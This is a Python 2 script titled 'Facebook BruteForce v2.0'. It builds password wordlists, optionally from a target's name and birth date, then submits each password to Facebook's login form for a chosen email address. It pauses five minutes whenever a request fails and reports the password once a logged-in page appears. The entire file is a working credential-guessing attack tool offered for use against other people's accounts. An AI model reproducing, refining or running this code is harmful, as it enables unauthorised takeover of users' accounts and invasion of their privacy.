################################################################################
################################################################################
#Modiied by VARTECH
import time
import sys

if sys.version_info[0] !=2:
	print('''--------------------------------------
	REQUIRED PYTHON 2.x
	use: python fb2.py
--------------------------------------
			''')
	sys.exit()

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import mechanize
	import urllib2
	browser = mechanize.Browser()
	browser.addheaders = [('User-Agent',headers['User-Agent'])]
	browser.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()
###############################################################################
#########################FOR WORDLIST GENERATION###############################
import itertools
def customlist():
	pass
	print("GENERATING YOUR CUSTOM WORDLIST")
	start = input("enter minimum length:")
	final = input("enter maximum length:")
	user_data = raw_input("\n Do you want to enter personal data ? [y/N]: ")
	if user_data is "y":
		first_name = raw_input("\n Fist Name: ")
		last_name = raw_input("\n Last Name: ")
		birthday = input("\n Birthday: ")
		month = input("\n Month: ")
		year = input("\n Year: ")
		chrs = first_name + last_name + str(birthday) +str(month) +str(year)
	else:
		print(".............ok i will add random letters.......")
		chrs ="abcdefghijklmnopqrstuvwxyz"
	file_name = raw_input('\n Insert a name for your wordlist file with extension(ex:txt,lst...): ')
	arq = open(file_name, 'w')
	if raw_input('\nDo you want to use uppercase characters? (y/n): ') is 'y':
		chrs_up = chrs.upper()
		chrs = ''.join([chrs, chrs_up])
	if raw_input('\nDo you want to use special characters? (y/n): ') is 'y':
			chrs_specials = '!\][/?.,~-=";:><@#$%&*()_+\' '
			chrs = ''.join([chrs, chrs_specials])
	if raw_input('\n Do you want to use numeric characters? (y/n): ') is 'y':
		chrs_numerics = '1234567890'
		chrs = ''.join([chrs, chrs_numerics])
	count=0
	final_value=input("enter maximum lines(note:more then 10k are preferable:")
	for i in range(start,final+1):
		for j in itertools.product(chrs, repeat=i):
			if count==final_value:
				break
			else:
				temp = ''.join(j)
				arq.write(temp + '\n')
				count=count+1
	arq.close()
	print("process completed")
	print("thanks for using")
	return file_name
###############################################################################
#####################This is for bruteforce####################################
print('\n---------- Welcome To Facebook BruteForce v2.0 ----------\n')
usin=raw_input("Do you have password file y/N")
if usin is ('y' or 'Y'):
	fpath=raw_input("enter path for file")
elif usin is ('n' or'N'):
	uopn=input("select the following options \n1)custom wordlist generation:\n2)use default password file:\n")
	if uopn ==1:
		fpath=customlist()
	else:
		fpath="passwords.txt"
file=open(fpath,'r')
email=str(raw_input('Enter Email/Username : ').strip())

print "\nTarget Email ID : ",email
print "\nTrying Passwords from list ..."

i=0
while file:
	passw=file.readline().strip()
	i+=1
	print str(i) +" : ",passw
	response = browser.open(post_url)
	try:
		if response.code == 200:
			browser.select_form(nr=0)
			browser.form['email'] = email
			browser.form['pass'] = passw
			response = browser.submit()
			if 'Find Friends' in response.read():
				print('Your password is : ',passw)
				break
	except:
		print('\nSleeping for time : 5 min\n')
		time.sleep(300)
###############################################################################
